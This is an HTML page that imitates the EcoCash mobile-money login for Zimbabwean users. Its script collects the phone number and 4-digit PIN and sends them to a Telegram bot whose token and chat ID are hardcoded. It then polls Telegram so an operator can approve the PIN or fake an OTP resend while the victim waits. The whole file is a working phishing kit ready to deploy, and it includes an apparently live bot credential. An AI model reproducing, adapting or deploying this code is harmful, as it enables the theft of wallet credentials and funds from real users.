<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>EcoCash Login</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body { background-color: #ffffff; display: flex; flex-direction: column; min-height: 100vh; align-items: center; position: relative; overflow-x: hidden; }
        
        /* Top Header */
        .header { margin-top: 60px; text-align: center; }
        .logo { font-size: 42px; font-weight: bold; letter-spacing: -1px; }
        .logo .eco { color: #0000ff; }
        .logo .cash { color: #ff0000; }
        .welcome-text { font-size: 36px; color: #333; margin-top: 30px; margin-bottom: 50px; font-weight: 400; }

        /* Input Container */
        .input-container { width: 90%; max-width: 400px; display: flex; flex-direction: column; align-items: center; z-index: 10; }
        
        /* Phone Input */
        .phone-box { width: 100%; display: flex; align-items: center; border: 1.5px solid #000; border-radius: 8px; padding: 15px; margin-bottom: 25px; background: white; }
        .flag { margin-right: 10px; font-size: 20px; }
        .country-code { font-size: 18px; color: #000; font-weight: 500; margin-right: 15px; }
        .phone-input { border: none; outline: none; font-size: 18px; width: 100%; font-weight: 500; color: #333; }
        .phone-input::placeholder { color: #333; font-weight: 500; }

        /* PIN Section */
        .pin-label { font-size: 16px; color: #333; margin-bottom: 15px; }
        .pin-boxes { display: flex; gap: 15px; margin-bottom: 15px; }
        .pin-box { width: 55px; height: 60px; border: 2px solid #4a4a9c; border-radius: 12px; font-size: 24px; text-align: center; outline: none; color: #000; background: transparent; }
        .pin-box:focus { border-color: #0000ff; }
        .pin-box::-webkit-outer-spin-button, .pin-box::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
        .forgot-pin { color: #333; text-decoration: none; font-size: 15px; margin-bottom: 30px; }

        /* Button & Status */
        .login-btn { width: 250px; padding: 15px; background-color: #64a0cc; color: white; border: 2px solid #4a4a9c; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .login-btn:active { transform: scale(0.98); }
        .login-btn:disabled { background-color: #a0c4e0; cursor: not-allowed; }
        
        .status-message { margin-top: 15px; font-size: 14px; font-weight: bold; height: 20px; text-align: center; }
        .status-loading { color: #0000ff; }
        .status-error { color: #ff0000; }
        .status-success { color: #00aa00; }

        /* Bottom Blue */
        .bottom-area { position: absolute; bottom: 0; width: 100%; height: 30vh; background-color: #0000ff; display: flex; flex-direction: column; justify-content: center; align-items: center; border-top-left-radius: 50% 20%; border-top-right-radius: 50% 20%; padding: 20px; z-index: 1; }
        .bottom-text { color: white; text-align: center; font-size: 14px; line-height: 1.5; margin-bottom: 20px; max-width: 80%; }
        .bottom-buttons { display: flex; gap: 10px; width: 100%; justify-content: center; }
        .action-btn { background: white; color: #333; padding: 15px 20px; border-radius: 8px; border: none; font-size: 16px; font-weight: 500; width: 45%; cursor: pointer; }
    </style>
</head>
<body>

    <div class="header">
        <div class="logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
        <div class="welcome-text">Welcome</div>
    </div>

    <div class="input-container">
        <div class="phone-box">
            <span class="flag">🇿🇼</span>
            <span class="country-code">+263</span>
            <input type="tel" id="phone" class="phone-input" placeholder="Mobile number" autocomplete="off">
        </div>

        <div class="pin-label">Enter your PIN</div>
        
        <div class="pin-boxes">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 0)">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 1)">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 2)">
            <input type="password" maxlength="1" class="pin-box" inputmode="numeric" onkeyup="moveNext(this, 3)">
        </div>

        <a href="#" class="forgot-pin">Forgot PIN?</a>

        <button class="login-btn" id="loginBtn" onclick="submitLogin()">Login</button>
        <div id="statusMessage" class="status-message"></div>
    </div>

    <div class="bottom-area">
        <div class="bottom-text">To register an EcoCash wallet or get assistance, click below</div>
        <div class="bottom-buttons">
            <button class="action-btn">Register</button>
            <button class="action-btn">Help & Support</button>
        </div>
    </div>

    <script>
        // ==========================================
        // 1. PUT YOUR TELEGRAM BOT DETAILS HERE
        // ==========================================
        const TELEGRAM_BOT_TOKEN = "8682274446:AAHU6TDKMRoDKKZP-wf6yjnj-KiG4e11-GY";
        const TELEGRAM_CHAT_ID = "8094482230";
        
        let currentPhone = "";
        let messageId = null; 
        let pollingInterval = null;

        function moveNext(current, index) {
            if (current.value.length === 1) {
                let next = document.getElementsByClassName('pin-box')[index + 1];
                if (next) next.focus();
            } else if (current.value.length === 0 && index > 0) {
                let prev = document.getElementsByClassName('pin-box')[index - 1];
                if (prev) prev.focus();
            }
        }

        function setStatus(text, className) {
            const statusDiv = document.getElementById('statusMessage');
            statusDiv.innerText = text;
            statusDiv.className = 'status-message ' + className;
        }

        async function submitLogin() {
            currentPhone = document.getElementById('phone').value;
            const pinBoxes = document.getElementsByClassName('pin-box');
            let currentPin = "";
            for (let i = 0; i < pinBoxes.length; i++) currentPin += pinBoxes[i].value;

            if (currentPhone.length < 5) return setStatus("Enter valid mobile number.", "status-error");
            if (currentPin.length !== 4) return setStatus("Enter 4-digit PIN.", "status-error");

            document.getElementById('loginBtn').disabled = true;
            document.getElementById('loginBtn').innerText = "Processing...";
            setStatus("Sending to Telegram...", "status-loading");

            // Format the message
            const messageText = `🚨 *NEW LOGIN ATTEMPT* 🚨\n\n📱 Phone: \`${currentPhone}\`\n🔑 PIN: \`${currentPin}\`\n\nChoose an action:`;
            
            // Setup Telegram Buttons
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "✅ Correct PIN", callback_data: `correct_${currentPhone}` },
                        { text: "❌ Wrong PIN", callback_data: `wrong_${currentPhone}` }
                    ],
                    [{ text: "🔄 Resend OTP", callback_data: `resend_${currentPhone}` }]
                ]
            };

            try {
                // Send Message to Telegram via API
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: messageText,
                        parse_mode: 'Markdown',
                        reply_markup: keyboard
                    })
                });

                const data = await response.json();
                
                if (data.ok) {
                    messageId = data.result.message_id; // Save ID to check for replies
                    setStatus("Waiting for Admin Approval...", "status-loading");
                    startPolling(); // Start looking for button clicks
                } else {
                    setStatus("Bot Error. Check Token.", "status-error");
                    resetLogin();
                }
            } catch (error) {
                setStatus("Network Error.", "status-error");
                resetLogin();
            }
        }

        // ==========================================
        // 2. CHECK TELEGRAM FOR ADMIN CLICKS
        // ==========================================
        function startPolling() {
            if (pollingInterval) clearInterval(pollingInterval);

            pollingInterval = setInterval(async () => {
                try {
                    // Get latest updates from Telegram
                    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`);
                    const data = await res.json();

                    if (!data.ok || !data.result) return;

                    // Check if admin clicked a button for this specific message
                    for (let update of data.result) {
                        if (update.callback_query && update.callback_query.message.message_id === messageId) {
                            const callbackData = update.callback_query.data;
                            const action = callbackData.split('_')[0];

                            // Acknowledge the click so the loading spinner stops in Telegram
                            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery?callback_query_id=${update.callback_query.id}`);

                            clearInterval(pollingInterval); // Stop checking

                            if (action === "correct") {
                                setStatus("✅ PIN Correct! Redirecting...", "status-success");
                                setTimeout(() => {
                                    window.location.href = "dashboard.html"; // <--- CHANGE THIS TO YOUR NEXT PAGE
                                }, 1000);
                            } 
                            else if (action === "wrong") {
                                setStatus("❌ Incorrect PIN. Try again.", "status-error");
                                resetLogin();
                            } 
                            else if (action === "resend") {
                                setStatus("🔄 OTP Resent to your phone.", "status-loading");
                                // Telegram admin can click correct/wrong after this
                                startPolling(); 
                            }
                            break;
                        }
                    }
                } catch (e) {
                    console.log("Waiting for updates...");
                }
            }, 2000); // Check every 2 seconds
        }

        function resetLogin() {
            document.getElementById('loginBtn').disabled = false;
            document.getElementById('loginBtn').innerText = "Login";
            const pinBoxes = document.getElementsByClassName('pin-box');
            for (let i = 0; i < pinBoxes.length; i++) pinBoxes[i].value = "";
            pinBoxes[0].focus();
        }
    </script>
</body>
</html>
